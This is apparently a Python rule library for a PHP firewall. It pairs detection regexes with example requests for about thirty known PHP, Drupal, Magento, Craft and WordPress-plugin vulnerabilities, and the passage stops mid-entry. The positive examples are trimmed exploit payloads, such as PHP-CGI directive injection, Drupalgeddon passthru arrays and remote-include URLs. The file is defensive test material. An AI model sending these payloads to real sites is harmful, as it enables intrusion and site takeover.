"""Rule library for phpwarden shield (inside-PHP protection, stage 1).

Each entry describes the *request shape* a well-documented exploit needs, scoped
to the vulnerable component's own entry points. It is written from public
advisories and write-ups (sources in each entry's ``refs``); no exploit code is
copied, only the parts of the request an exploit must contain.

A rule only reaches a site's policy when the component is installed in an
affected version AND the vulnerability is exploited (CISA KEV) or likely to be
(EPSS >= 0.5) — see policy.py. Generic rules (``target.type == "generic"``)
describe things that are essentially never legitimate in a request.

Match spec (shared by the PHP agent and matcher.py):

  method      optional list of HTTP methods
  path        optional regex on the raw (still percent-encoded) URI path
  all         list of conditions, every one must hold:
                {"in": LOCATION, "name": NAME?, "re": REGEX?}
              LOCATION:
                "path"        raw path              "query"   raw query string
                "param"       decoded GET/POST value of NAME ("*" = any)
                "param_name"  any GET/POST key matching re
                "cookie"      decoded cookie NAME ("*" = any); re optional (presence)
                "header"      header NAME (case-insensitive); re optional (presence)
                "body"        raw request body (first 64 KB, non-multipart only)
                "file_name"   original filename of any uploaded file (multipart)
              A condition without "re" only requires the thing to exist.

Regexes are case-insensitive and must work in both Python ``re`` and PCRE:
no possessive quantifiers, no variable-length look-behind, no ``~``.
"""

# Request used in examples: {"method", "uri", "headers", "cookies", "body", "ctype"}
def R(method="GET", uri="/", headers=None, cookies=None, body="", ctype="", files=None):
    """files: [(field, filename), ...] sent as a multipart upload (the body is then
    the other form fields, urlencoded, and goes into the same multipart request)."""
    return {"method": method, "uri": uri, "headers": headers or {}, "cookies": cookies or {},
            "body": body, "ctype": ctype, "files": [list(f) for f in (files or [])]}


FORM = "application/x-www-form-urlencoded"
JSON = "application/json"

LIBRARY = [
    # ------------------------------------------------------------------ PHP engine
    {
        "id": "php-cgi-best-fit-argument-injection", "cve": "CVE-2024-4577",
        "target": {"type": "engine", "sapi": "cgi"},
        "description": "PHP-CGI on Windows: a soft hyphen (0xAD) at the start of the query is read as '-', "
                       "letting the query pass php.ini directives (-d allow_url_include / auto_prepend_file).",
        "refs": ["https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv",
                 "https://nvd.nist.gov/vuln/detail/CVE-2024-4577"],
        # %AD not preceded by a UTF-8 lead byte (so 'categor%C3%ADa' is fine), followed by a switch letter
        "all": [{"in": "query", "re": r"(?:^|&|\+)(?<!%[c-f][0-9a-f])%ad[dsbn]"}],
        "pos": [R(uri="/index.php?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input"),
                R(uri="/php-cgi/php-cgi.exe?%ads")],
        "neg": [R(uri="/?s=categor%C3%ADa"), R(uri="/blog/pol%C3%ADtica/?page=2")],
    },
    {
        "id": "php-cgi-query-switch", "cve": "CVE-2012-1823",
        "target": {"type": "engine", "sapi": "cgi"},
        "description": "PHP-CGI treats a query string without '=' that starts with '-' as command-line switches.",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2012-1823"],
        "all": [{"in": "query", "re": r"^-[a-z](?:[^=&]*(?:\+|%20)-[a-z])*[^=&]*$|^-d(?:\+|%20)+[a-z_.]+(?:=|%3d)"}],
        "pos": [R(uri="/index.php?-s"), R(uri="/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input")],
        "neg": [R(uri="/index.php?q=-s"), R(uri="/search?-sort=asc")],
    },
    {
        "id": "php-fpm-path-info-newline", "cve": "CVE-2019-11043",
        "target": {"type": "engine", "sapi": "fpm"},
        "description": "PHP-FPM with nginx fastcgi_split_path_info: a %0A in the path underflows env_path_info.",
        "refs": ["https://bugs.php.net/bug.php?id=78599", "https://nvd.nist.gov/vuln/detail/CVE-2019-11043"],
        "path": r"%0a",
        "all": [],
        "pos": [R(uri="/index.php/PHP_VALUE%0Asession.auto_start=1;;;?QQQ")],
        "neg": [R(uri="/contact?message=line1%0Aline2")],
    },
    # ------------------------------------------------------------------ Composer
    {
        "id": "phpunit-eval-stdin", "cve": "CVE-2017-9841",
        "target": {"type": "composer", "package": "phpunit/phpunit"},
        "description": "PHPUnit's Util/PHP/eval-stdin.php evaluates the request body when vendor/ is web-reachable.",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2017-9841"],
        "path": r"/phpunit/(?:phpunit/)?src/util/php/eval-stdin\.php",
        "all": [],
        "pos": [R("POST", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", body="<?php echo 1;", ctype="text/plain")],
        "neg": [R(uri="/docs/phpunit/")],
    },
    {
        "id": "laravel-ignition-execute-solution", "cve": "CVE-2021-3129",
        "target": {"type": "composer", "package": "facade/ignition"},
        "description": "Laravel Ignition with APP_DEBUG on: execute-solution accepts a viewFile pointing at a "
                       "php://filter or phar:// stream, leading to code execution.",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2021-3129",
                 "https://github.com/facade/ignition/releases/tag/2.5.2"],
        "path": r"/_ignition/execute-solution",
        "all": [{"in": "body", "re": r"viewfile|php://|phar://"}],
        "pos": [R("POST", "/_ignition/execute-solution",
                  body='{"solution":"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution",'
                       '"parameters":{"variableName":"x","viewFile":"php://filter/read=consumed/resource=../storage/logs/laravel.log"}}',
                  ctype=JSON)],
        "neg": [R(uri="/_ignition/health-check")],
    },
    {
        "id": "phpmailer-sender-injection", "cve": "CVE-2016-10033",
        "target": {"type": "composer", "package": "phpmailer/phpmailer"},
        "description": "PHPMailer mail() transport: a Sender address with an escaped quote passes extra "
                       "sendmail switches (-X log file, -OQueueDirectory).",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2016-10033",
                 "https://github.com/PHPMailer/PHPMailer/security/advisories"],
        "all": [{"in": "param", "name": "*", "re": r"\\\x22[^@]*\s-(?:x|oq|c)\S*\s*[^@]*@|\x22\s*-[ox]\s*\S+[^@]*@"}],
        "pos": [R("POST", "/contact.php", body="email=%22attacker%5C%22+-oQ%2Ftmp%2F+-X%2Fvar%2Fwww%2Fx.php+x%22%40example.com&msg=hi", ctype=FORM)],
        "neg": [R("POST", "/contact.php", body="email=anna-maria%40example.com&msg=-x+marks+the+spot", ctype=FORM)],
    },
    {
        "id": "thinkphp-invokefunction", "cve": "CVE-2018-20062",
        "target": {"type": "composer", "package": "topthink/framework"},
        "description": "ThinkPHP 5.0/5.1 routing: s=index/\\think\\app/invokefunction or think\\request/input "
                       "with a filter calls arbitrary PHP functions.",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2018-20062", "https://nvd.nist.gov/vuln/detail/CVE-2019-9082"],
        "all": [{"in": "param", "name": "s", "re": r"\\think\\(?:app|request|container|template\\driver)|invokefunction"}],
        "pos": [R(uri="/index.php?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1")],
        "neg": [R(uri="/index.php?s=index/blog/read&id=3")],
    },
    {
        "id": "thinkphp3-invokefunction", "cve": "CVE-2019-9082",
        "target": {"type": "composer", "package": "topthink/thinkphp"},
        "description": "ThinkPHP before 3.2.4: the same invokefunction routing shape.",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2019-9082"],
        "all": [{"in": "param", "name": "s", "re": r"\\think\\(?:app|request|container)|invokefunction"}],
        "pos": [R(uri="/public/?s=index/%5Cthink%5Capp/invokefunction&function=phpinfo")],
        "neg": [R(uri="/public/?s=index/index/hello")],
    },
    {
        "id": "magento-cosmicsting-xxe", "cve": "CVE-2024-34102",
        "target": {"type": "composer", "package": "magento/community-edition"},
        "description": "Adobe Commerce/Magento 'CosmicSting': a REST request whose JSON carries a "
                       "sourceData object with an XML entity declaration is parsed with external entities.",
        "refs": ["https://helpx.adobe.com/security/products/magento/apsb24-40.html",
                 "https://nvd.nist.gov/vuln/detail/CVE-2024-34102"],
        "path": r"/rest/(?:[a-z_]+/)?v1/",
        "all": [{"in": "body", "re": r"<!(?:doctype|entity)[^>]*(?:system|public)|sourcedata"}],
        "pos": [R("POST", "/rest/V1/guest-carts/abc/estimate-shipping-methods",
                  body='{"address":{"totalsReader":{"collectorList":{"totalCollector":{"sourceData":{"data":"<?xml version=\\"1.0\\"?><!DOCTYPE r [<!ENTITY % s SYSTEM \\"http://x\\">]><r/>"}}}}}}', ctype=JSON)],
        "neg": [R("POST", "/rest/V1/guest-carts/abc/estimate-shipping-methods",
                  body='{"address":{"country_id":"US","postcode":"10001"}}', ctype=JSON)],
    },
    {
        "id": "magento-template-filter", "cve": "CVE-2022-24086",
        "target": {"type": "composer", "package": "magento/community-edition"},
        "description": "Adobe Commerce/Magento: template directives ({{...}}) in checkout/address fields are "
                       "evaluated by the template filter.",
        "refs": ["https://helpx.adobe.com/security/products/magento/apsb22-12.html"],
        "path": r"/(?:rest/(?:[a-z_]+/)?v1/|checkout/|customer/)",
        "all": [{"in": "body", "re": r"\{\{\s*(?:var|block|layout|trans|depend|if)\b[^}]*(?:getTemplateFilter|filter|setVariables|this\.)"}],
        "pos": [R("POST", "/rest/V1/guest-carts/abc/shipping-information",
                  body='{"addressInformation":{"shipping_address":{"firstname":"{{var this.getTemplateFilter().filter(x)}}"}}}', ctype=JSON)],
        "neg": [R("POST", "/rest/V1/guest-carts/abc/shipping-information",
                  body='{"addressInformation":{"shipping_address":{"firstname":"Anna {Bee}"}}}', ctype=JSON)],
    },
    {
        "id": "drupalgeddon2-render-array", "cve": "CVE-2018-7600",
        "target": {"type": "composer", "package": "drupal/core"},
        "description": "Drupal Form API: request keys starting with '#' (#post_render, #lazy_builder, "
                       "#markup with element_parents) are treated as render-array properties.",
        "refs": ["https://www.drupal.org/sa-core-2018-002", "https://nvd.nist.gov/vuln/detail/CVE-2018-7600"],
        "all": [{"in": "param_name", "re": r"(?:^|\[)#(?:post_render|pre_render|lazy_builder|access_callback|value_callback|markup|submit)"}],
        "pos": [R("POST", "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
                  body="form_id=user_register_form&_drupal_ajax=1&mail[%23post_render][]=exec&mail[%23type]=markup&mail[%23markup]=id", ctype=FORM)],
        "neg": [R("POST", "/user/register", body="form_id=user_register_form&mail=a%40b.c&name=anna", ctype=FORM)],
    },
    {
        "id": "drupalgeddon2-drupal7", "cve": "CVE-2018-7600",
        "target": {"type": "composer", "package": "drupal/drupal"},
        "description": "Drupal 7 packaging of the same Form API render-array injection.",
        "refs": ["https://www.drupal.org/sa-core-2018-002"],
        "all": [{"in": "param_name", "re": r"(?:^|\[)#(?:post_render|pre_render|lazy_builder|access_callback|value_callback|markup|submit)"}],
        "pos": [R("POST", "/?q=user/password&name[%23post_render][]=passthru&name[%23markup]=id", body="form_id=user_pass&_triggering_element_name=name", ctype=FORM)],
        "neg": [R("POST", "/?q=user/password", body="form_id=user_pass&name=anna", ctype=FORM)],
    },
    {
        "id": "craftcms-generate-transform", "cve": "CVE-2025-32432",
        "target": {"type": "composer", "package": "craftcms/cms"},
        "description": "Craft CMS: the asset generate-transform action accepts a handle object with __class / "
                       "behaviour keys, instantiating arbitrary classes.",
        "refs": ["https://github.com/craftcms/cms/security/advisories/GHSA-f3gw-9ww9-jmc3",
                 "https://nvd.nist.gov/vuln/detail/CVE-2025-32432"],
        "all": [{"in": "query", "re": r"(?:^|&)p=(?:[^&]*/)?actions/assets/generate-transform|action(?:=|%3d)assets(?:/|%2f)generate-transform"},
                {"in": "body", "re": r"__class|\bas\s+[a-z]+\b|__construct"}],
        "pos": [R("POST", "/index.php?p=admin/actions/assets/generate-transform",
                  body='{"assetId":11,"handle":{"width":123,"height":123,"as session":{"class":"craft\\\\behaviors\\\\FieldLayoutBehavior","__class":"GuzzleHttp\\\\Psr7\\\\FnStream"}}}', ctype=JSON)],
        "neg": [R("POST", "/index.php?p=admin/actions/assets/generate-transform", body='{"assetId":11,"handle":{"width":123,"height":123}}', ctype=JSON)],
    },
    {
        "id": "craftcms-register-argc-argv", "cve": "CVE-2024-56145",
        "target": {"type": "composer", "package": "craftcms/cms"},
        "description": "Craft CMS with register_argc_argv on: '--configPath=' / '--templatesPath=' in the query "
                       "are read as console options.",
        "refs": ["https://github.com/craftcms/cms/security/advisories/GHSA-2p6p-9rc9-62j9"],
        "all": [{"in": "query", "re": r"(?:^|&|\+)--(?:configpath|templatespath|basepath|vendorpath)(?:=|%3d)"}],
        "pos": [R(uri="/?--configPath=/aaa"), R(uri="/index.php?--templatesPath=ftp://x/")],
        "neg": [R(uri="/?q=--configPath+docs")],
    },
    {
        "id": "roundcube-upload-from-deserialization", "cve": "CVE-2025-49113",
        "target": {"type": "composer", "package": "roundcube/roundcubemail"},
        "description": "Roundcube settings upload: the _from parameter is not validated and reaches PHP "
                       "object deserialization.",
        "refs": ["https://roundcube.net/news/2025/06/01/security-updates-1.6.11-and-1.5.10",
                 "https://nvd.nist.gov/vuln/detail/CVE-2025-49113"],
        "all": [{"in": "param", "name": "_task", "re": r"^settings$"},
                {"in": "param", "name": "_action", "re": r"^upload$"},
                {"in": "param", "name": "_from", "re": r"[^a-z0-9_.-]"}],
        "pos": [R("POST", "/?_task=settings&_action=upload&_from=edit-!%22%3B%7Di%3A0%3BO%3A16%3A%22Crypt_GPG_Engine%22",
                  body="", ctype=FORM)],
        "neg": [R("POST", "/?_task=settings&_action=upload&_from=edit-identity", body="", ctype=FORM)],
    },
    {
        "id": "phpmyadmin-setup-config-injection", "cve": "CVE-2009-1151",
        "target": {"type": "composer", "package": "phpmyadmin/phpmyadmin"},
        "description": "phpMyAdmin setup.php writes request values into a configuration file unescaped.",
        "refs": ["https://www.phpmyadmin.net/security/PMASA-2009-3/"],
        "path": r"/(?:scripts/)?setup\.php",
        "all": [{"in": "param", "name": "*", "re": r"\*/|<\?php|\beval\s*\(|\bsystem\s*\("}],
        "pos": [R("POST", "/phpmyadmin/scripts/setup.php", body="action=save&configuration=a%3A1%3A%7Bi%3A0%3BO%3A10%3A%22PMA_Config%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A11%3A%22*%2Fsystem(1)%22%3B%7D%7D", ctype=FORM)],
        "neg": [R(uri="/phpmyadmin/scripts/setup.php")],
    },
    # ------------------------------------------------------------------ WordPress plugins
    {
        "id": "wp-file-manager-connector", "cve": "CVE-2020-25213",
        "target": {"type": "wp-plugin", "slug": "wp-file-manager"},
        "description": "File Manager: the bundled elFinder connector.minimal.php accepts uploads without login.",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2020-25213"],
        "path": r"/wp-content/plugins/wp-file-manager/lib/php/connector\.minimal\.php",
        "all": [],
        "pos": [R("POST", "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php", body="cmd=upload&target=l1_Lw", ctype=FORM)],
        "neg": [R(uri="/wp-content/plugins/wp-file-manager/css/style.css")],
    },
    {
        "id": "litespeed-cache-role-cookie", "cve": "CVE-2024-28000",
        "target": {"type": "wp-plugin", "slug": "litespeed-cache"},
        "description": "LiteSpeed Cache: the crawler's role-simulation cookies (litespeed_role with a weak "
                       "litespeed_hash) let a visitor act as an administrator.",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2024-28000"],
        "all": [{"in": "cookie", "name": "litespeed_role"}, {"in": "cookie", "name": "litespeed_hash"}],
        "pos": [R("POST", "/wp-json/wp/v2/users", cookies={"litespeed_role": "1", "litespeed_hash": "abc12"}, body='{"username":"x"}', ctype=JSON)],
        "neg": [R(uri="/", cookies={"_lscache_vary": "1"})],
    },
    {
        "id": "backup-migration-content-dir", "cve": "CVE-2023-6553",
        "target": {"type": "wp-plugin", "slug": "backup-backup"},
        "description": "Backup Migration: backup-heart.php includes a file built from the Content-Dir header.",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2023-6553"],
        "path": r"/wp-content/plugins/backup-backup/includes/backup-heart\.php",
        "all": [{"in": "header", "name": "Content-Dir"}],
        "pos": [R("POST", "/wp-content/plugins/backup-backup/includes/backup-heart.php", headers={"Content-Dir": "php://filter/x"})],
        "neg": [R(uri="/wp-content/plugins/backup-backup/includes/backup-heart.php")],
    },
    {
        "id": "wp-automatic-csv-sql", "cve": "CVE-2024-27956",
        "target": {"type": "wp-plugin", "slug": "wp-automatic"},
        "description": "WordPress Automatic: inc/csv.php runs the q parameter as SQL with a weak auth check.",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2024-27956"],
        "path": r"/wp-content/plugins/wp-automatic/inc/csv\.php",
        "all": [{"in": "param", "name": "q", "re": r"\b(?:select|insert|update|delete|union)\b"}],
        "pos": [R("POST", "/wp-content/plugins/wp-automatic/inc/csv.php", body="q=INSERT+INTO+wp_users+VALUES(1)&auth=%00&integ=x", ctype=FORM)],
        "neg": [R(uri="/wp-content/plugins/wp-automatic/inc/csv.php")],
    },
    {
        "id": "duplicator-download-traversal", "cve": "CVE-2020-11738",
        "target": {"type": "wp-plugin", "slug": "duplicator"},
        "description": "Duplicator: the duplicator_download action reads any file named in 'file'.",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2020-11738"],
        "all": [{"in": "param", "name": "action", "re": r"^duplicator_(?:download|init)$"},
                {"in": "param", "name": "file", "re": r"\.\.|^/|wp-config"}],
        "pos": [R(uri="/wp-admin/admin-ajax.php?action=duplicator_download&file=..%2Fwp-config.php")],
        "neg": [R(uri="/wp-admin/admin-ajax.php?action=duplicator_download&file=20261114_site_archive.zip")],
    },
    {
        "id": "social-warfare-swp-url", "cve": "CVE-2019-9978",
        "target": {"type": "wp-plugin", "slug": "social-warfare"},
        "description": "Social Warfare: swp_debug=load_options with swp_url fetches and evaluates remote content.",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2019-9978"],
        "all": [{"in": "param", "name": "swp_debug", "re": r"load_options"}, {"in": "param", "name": "swp_url"}],
        "pos": [R(uri="/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://x/p.txt")],
        "neg": [R(uri="/?swp_debug=1")],
    },
    {
        "id": "kaswara-upload-font-icon", "cve": "CVE-2021-24284",
        "target": {"type": "wp-plugin", "slug": "kaswara"},
        "description": "Kaswara Modern VC Addons: the uploadFontIcon AJAX action uploads arbitrary zip files.",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2021-24284"],
        "all": [{"in": "param", "name": "action", "re": r"^uploadFontIcon$"}],
        "pos": [R("POST", "/wp-admin/admin-ajax.php?action=uploadFontIcon", body="", ctype=FORM)],
        "neg": [R(uri="/wp-admin/admin-ajax.php?action=heartbeat")],
    },
    {
        "id": "bricks-render-element-query-editor", "cve": "CVE-2024-25600",
        "target": {"type": "wp-theme", "slug": "bricks"},
        "description": "Bricks Builder: the render_element REST route runs queryEditor code without capability checks.",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2024-25600"],
        "all": [{"in": "query", "re": r"rest_route=(?:%2f|/)bricks(?:%2f|/)v1(?:%2f|/)render_element"},
                {"in": "body", "re": r"queryeditor|useQueryEditor"}],
        "pos": [R("POST", "/?rest_route=/bricks/v1/render_element", body='{"postId":"1","nonce":"x","element":{"name":"container","settings":{"hasLoop":"true","query":{"useQueryEditor":true,"queryEditor":"x"}}}}', ctype=JSON)],
        "neg": [R("POST", "/?rest_route=/bricks/v1/render_element", body='{"postId":"1","element":{"name":"heading"}}', ctype=JSON)],
    },
    {
        "id": "bricks-render-element-rest", "cve": "CVE-2024-25600",
        "target": {"type": "wp-theme", "slug": "bricks"},
        "description": "Bricks Builder: same route reached through /wp-json/.",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2024-25600"],
        "path": r"/wp-json/bricks/v1/render_element",
        "all": [{"in": "body", "re": r"queryeditor|useQueryEditor"}],
        "pos": [R("POST", "/wp-json/bricks/v1/render_element", body='{"element":{"settings":{"query":{"queryEditor":"x"}}}}', ctype=JSON)],
        "neg": [R("POST", "/wp-json/bricks/v1/render_element", body='{"element":{"name":"heading"}}', ctype=JSON)],
    },
    {
        "id": "woocommerce-payments-impersonation", "cve": "CVE-2023-28121",
        "target": {"type": "wp-plugin", "slug": "woocommerce-payments"},
        "description": "WooCommerce Payments: the X-WCPAY-PLATFORM-CHECKOUT-USER header makes a request run as any user.",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2023-28121"],
        "all": [{"in": "header", "name": "X-WCPAY-PLATFORM-CHECKOUT-USER"}],
        "pos": [R("POST", "/wp-json/wp/v2/users", headers={"X-WCPAY-PLATFORM-CHECKOUT-USER": "1"}, body='{"username":"x"}', ctype=JSON)],
        "neg": [R(uri="/checkout/")],
    },
    {
        "id": "essential-addons-password-reset", "cve": "CVE-2023-32243",
        "target": {"type": "wp-plugin", "slug": "essential-addons-for-elementor-lite"},
        "description": "Essential Addons for Elementor: the login/register handler resets any user's password "
                       "when eael-resetpassword-submit and rp_login are posted.",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2023-32243"],
        "all": [{"in": "param", "name": "eael-resetpassword-submit"}, {"in": "param", "name": "rp_login"}],
        "pos": [R("POST", "/wp-admin/admin-ajax.php", body="action=login_or_register_user&eael-resetpassword-submit=true&page_id=1&widget_id=1&eael-resetpassword-nonce=x&eael-pass1=p&eael-pass2=p&rp_login=admin", ctype=FORM)],
        "neg": [R("POST", "/wp-admin/admin-ajax.php", body="action=login_or_register_user&eael-login-submit=true", ctype=FORM)],
    },
    {
        "id": "really-simple-ssl-2fa-skip", "cve": "CVE-2024-10924",
        "target": {"type": "wp-plugin", "slug": "really-simple-ssl"},
        "description": "Really Simple Security: the two_fa skip_onboarding REST route logs in as the user_id sent.",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2024-10924"],
        "path": r"/(?:wp-json/)?reallysimplessl/v1/two_fa/skip_onboarding|rest_route=(?:%2f|/)reallysimplessl",
        "all": [{"in": "body", "re": r"login_nonce"}],
        "pos": [R("POST", "/wp-json/reallysimplessl/v1/two_fa/skip_onboarding", body='{"user_id":1,"login_nonce":"123","redirect_to":"/wp-admin/"}', ctype=JSON)],
        "neg": [R(uri="/wp-json/reallysimplessl/v1/")],
    },
    {
        "id": "wp-core-upgrade-staging-php", "cve": "CVE-2026-119977",
        "target": {"type": "wp-core"},
        "description": "WordPress core upgrades: PHP files requested directly from the web-reachable staging "
                       "folder used during full-package core upgrades.",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2026-119977"],
        "path": r"/wp-content/upgrade(?:-temp-backup)?/[^?]*\.php",
        "all": [],
        "pos": [R(uri="/wp-content/upgrade/wordpress-7.1.4-abc/wordpress/x.php")],
        "neg": [R(uri="/wp-admin/update-core.php")],
    },
    # ------------------------------------------------------------- 2026-11 additions
    {
        "id": "drupalgeddon3-destination", "cve": "CVE-2018-7602",
        "target": {"type": "composer", "package": "drupal/core"},
        "description": "Drupal 7/8: render-array keys hidden in a double-encoded destination parameter "
                       "(q[%2523]...) become '#' keys when the confirm form redirects.",
        "refs": ["https://www.drupal.org/sa-core-2018-004", "https://nvd.nist.gov/vuln/detail/CVE-2018-7602"],
        "all": [{"in": "param", "name": "destination", "re": r"(?:\[|^|&|\?)(?:%23|#)"}],
        "pos": [R(uri="/?q=node/1/delete&destination=node%3Fq%5B%2523%5D%5B%5D%3Dpassthru%26q%5B%2523type%5D%3Dmarkup"),
                R(uri="/node/1/delete?destination=node?q[%2523post_render][]=x")],
        "neg": [R(uri="/?q=node/1/delete&destination=admin/content"),
                R(uri="/user/login?destination=/node/5%23comments"),
                R(uri="/node/1/edit?destination=node/1")],
    },
    {
        "id": "drupal-rest-link-options-unserialize", "cve": "CVE-2019-6340",
        "target": {"type": "composer", "package": "drupal/core"},
        "description": "Drupal 8 REST (hal_json): a link field's options value is passed to unserialize(); "
                       "the exploit sends it as a PHP-serialized object string.",
        "refs": ["https://www.drupal.org/sa-core-2019-003", "https://nvd.nist.gov/vuln/detail/CVE-2019-6340",
                 "https://blog.lexfo.fr/drupal8-rce.html"],
        "all": [{"in": "body", "re": r"\"options\"\s*:\s*\"\s*[OC]:\+?\d+:"}],
        "pos": [R("GET", "/node/1?_format=hal_json", ctype="application/hal+json",
                  body='{"link":[{"value":"link","options":"O:24:\\"GuzzleHttp\\\\Psr7\\\\FnStream\\":2:{}"}],"_links":{"type":{"href":"http://x/rest/type/shortcut/default"}}}'),
                R("POST", "/node?_format=hal_json", ctype="application/hal+json",
                  body='{"link":[{"value":"x","options":"C:11:\\"ArrayObject\\":1:{}"}]}')],
        "neg": [R("POST", "/node?_format=hal_json", ctype="application/hal+json",
                  body='{"link":[{"uri":"internal:/","options":{"attributes":{"class":"a"}}}]}'),
                R("PATCH", "/node/1?_format=json", ctype=JSON, body='{"title":[{"value":"O: hello"}]}')],
    },
    {
        "id": "drupal-upload-double-extension", "cve": "CVE-2020-13671",
        "target": {"type": "composer", "package": "drupal/core"},
        "description": "Drupal: uploaded filenames with a dangerous extension followed by another one "
                       "(shell.php.txt) are not renamed and can run as PHP on some servers.",
        "refs": ["https://www.drupal.org/sa-core-2020-012", "https://nvd.nist.gov/vuln/detail/CVE-2020-13671"],
        "all": [{"in": "file_name", "re": r"\.(?:phar|php\d?|phtml|pht|pl|py|cgi|asp)\.[^.\\/]+$"}],
        "pos": [R("POST", "/node/add/article", files=[("files[field_image_0]", "shell.php.txt")]),
                R("POST", "/file/upload/node/article/field_doc?_format=json", files=[("file", "a.phtml.jpg")])],
        "neg": [R("POST", "/node/add/article", files=[("files[field_image_0]", "photo.jpg")]),
                R("POST", "/node/add/article", files=[("file", "report.final.pdf")]),
                R("POST", "/node/add/article", files=[("file", "backup.tar.gz")])],
    },
    {
        "id": "livewire-update-synth-tuple", "cve": "CVE-2025-54068",
        "target": {"type": "composer", "package": "livewire/livewire"},
        "description": "Livewire 3 before 3.6.4: a property update sent as a synthesizer tuple "
                       "([value, {\"s\": \"clctn\", ...}]) is hydrated into arbitrary objects.",
        "refs": ["https://github.com/livewire/livewire/security/advisories/GHSA-29cq-5w36-x7w3",
                 "https://github.com/livewire/livewire/commit/ef04be759da41b14d2d129e670533180a44987dc"],
        "path": r"/livewire/update",
        "all": [{"in": "body", "re": r"\"updates\"\s*:"},
                {"in": "body", "re": r"[\[,]\s*\{\s*\"s\"\s*:\s*\"(?:clctn|mdl|mdlcol|frm|arr|std|stdcls|enm|dt|cbn|int|float|str|fil|wrbl)\""}],
        "pos": [R("POST", "/livewire/update", ctype=JSON,
                  body='{"_token":"x","components":[{"snapshot":"{\\"data\\":{}}","updates":{"foo":[{"a":1},{"s":"clctn","class":"X"}]},"calls":[]}]}'),
                R("POST", "/livewire/update", ctype=JSON,
                  body='{"_token":"x","components":[{"snapshot":"{}","updates":{"items.0":[[],{"s":"mdl","class":"Y"}]},"calls":[]}]}')],
        "neg": [R("POST", "/livewire/update", ctype=JSON,
                  body='{"components":[{"snapshot":"{\\"data\\":{\\"q\\":[null,{\\"s\\":\\"arr\\"}]},\\"memo\\":{}}","updates":{"q":"hello"},"calls":[]}]}'),
                R("POST", "/livewire/update", ctype=JSON, body='{"components":[{"snapshot":"{}","updates":{"tags":["a","b"]},"calls":[]}]}'),
                R("POST", "/livewire/update", ctype=JSON, body='{"components":[{"snapshot":"{}","updates":{"rows":[{"s":"1"}]},"calls":[]}]}')],
    },
    {
        "id": "craftcms-session-php-in-cp-url", "cve": "CVE-2025-35939",
        "target": {"type": "composer", "package": "craftcms/cms"},
        "description": "Craft CMS: an unauthenticated control-panel URL is stored in the session file as "
                       "the return URL, so PHP code in its query lands on disk (used with CVE-2025-32432).",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2025-35939", "https://github.com/craftcms/cms/pull/17220"],
        "all": [{"in": "query", "re": r"(?:<|%3c)(?:\?|%3f)(?:php|=|%3d)"}],
        "pos": [R(uri="/index.php?p=admin/dashboard&a=%3C%3Fphp%20phpinfo()%3B%3F%3E"),
                R(uri="/admin/dashboard?x=%3C%3F%3Dsystem(1)%3F%3E")],
        "neg": [R(uri="/admin/dashboard"), R(uri="/index.php?p=admin/entries&search=php"),
                R(uri="/admin/login?returnUrl=%2Fadmin%2Fentries")],
    },
    {
        "id": "yii2-behavior-class-key", "cve": "CVE-2024-58136",
        "target": {"type": "composer", "package": "yiisoft/yii2"},
        "description": "Yii2 before 2.0.52: a behavior config array whose class comes from a __class key "
                       "is attached when request data is mass-assigned to a component.",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2024-58136", "https://github.com/yiisoft/yii2/pull/20232"],
        "all": [{"in": "any", "re": r"\"__class\"\s*:"}],
        "pos": [R("POST", "/x", ctype=JSON, body='{"a":{"as b":{"__class":"yii\\\\rbac\\\\PhpManager"}}}')],
        "neg": [R("POST", "/site/login", ctype=FORM, body="LoginForm[username]=u&LoginForm[password]=p"),
                R("POST", "/x", ctype=JSON, body='{"class":"btn","label":"__class is a word"}')],
    },
    {
        "id": "yii2-behavior-class-param", "cve": "CVE-2024-58136",
        "target": {"type": "composer", "package": "yiisoft/yii2"},
        "description": "Yii2 before 2.0.52: the same __class behavior key sent as a form field name.",
        "refs": ["https://nvd.nist.gov/vuln/detail/CVE-2024-58136", "https://github.com/yiisoft/yii2/pull/20232"],
        "all": [{"in": "param_name", "re": r"(?:^|\[)__class(?:\]|$)"}],
        "pos": [R("POST", "/x", ctype=FORM, body="a[as b][__class]=Foo")],
        "neg": [R("POST", "/site/login", ctype=FORM, body="LoginForm[username]=u&LoginForm[password]=p")],
    },
    {
        "id": "octobercms-reset-code-array", "cve": "CVE-2021-32648",
        "target": {"type": "composer", "package": "october/system"},
        "description": "October CMS: the backend password reset compares the code loosely, so a code sent "
                       "as an array passes the check.",
        "refs": ["https://github.com/octobercms/october/security/advisories/GHSA-mxr5-mc97-63rc",
                 "https://nvd.nist.gov/vuln/detail/CVE-2021-32648"],
        "path": r"/backend/backend/auth/reset",
        "all": [{"in": "param_name", "re": r"^code\["}],
